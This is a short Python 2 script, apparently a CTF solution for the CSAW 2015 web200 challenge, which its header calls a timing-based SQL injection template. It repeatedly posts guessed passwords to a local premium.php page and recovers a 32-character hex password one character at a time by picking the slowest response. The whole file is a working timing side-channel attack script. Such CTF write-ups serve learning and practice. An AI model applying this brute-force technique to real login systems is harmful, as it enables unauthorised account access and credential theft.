'''
    Author : angelwhu
    Created time :  2015/09/22
    Description :  write a sqli template based on timing
'''

import requests
from requests.auth import HTTPBasicAuth
import sys
from bs4 import BeautifulSoup

class SqlTime(object):
    def __init__(self):
        self.session = requests.Session()
        self.chars = "0123456789abcdef";

    def produce_password(self,password):

        passwd = password + (32 - len(password)) * '-'
        #print passwd
        return passwd

    def get_time(self,password):

        url = "http://localhost/CSAW2015web200/premium.php";
        post_data = {'username':'~~FLAG~~','password':self.produce_password(password)}
        headers = {"Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.5",
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive"}
        response = self.session.post(url, headers=headers,data=post_data)
        #print response.text

        bs = BeautifulSoup(response.text.replace("</br />",""))
        form_section = bs.findAll('h1') #Error message

        t = form_section[0]
        #if ("Not Authorized" in str(t)) :
        return response.elapsed.total_seconds(); # get respones time .
        #else :
            #return 0;


    def go(self):
        passwd = "";
        for i in range(32):
            max_time = 0;
            char_tmp = "";
            for char in self.chars:
                respones_time = self.get_time(passwd + char);
                print str(i) + "round : [" + char + "] spend " + str(respones_time) + " seconds. "
                if respones_time > max_time:
                    max_time = respones_time;
                    char_tmp = char;

            passwd = passwd + char_tmp;
            print str(i) + "round : password is [" + passwd + "] *. "

